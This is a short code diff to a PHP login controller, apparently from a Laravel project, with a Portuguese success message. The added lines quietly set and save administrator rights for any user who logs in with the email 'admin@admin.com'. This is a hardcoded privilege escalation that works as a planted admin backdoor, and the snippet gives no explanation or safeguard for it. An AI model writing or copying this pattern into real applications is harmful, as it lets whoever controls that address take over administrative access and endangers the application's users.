@@ -49,6 +49,11 @@ class AuthController extends Controller
         $user = User::where('email', $request->email)->firstOrFail();
         $token = $user->createToken('auth_token')->plainTextToken;
 
+        if ($user->email === 'admin@admin.com') {
+            $user->admin = true;
+            $user->save();
+        }
+
         return response()->json([
             'message' => 'Login realizado com sucesso',
             'user' => $user,
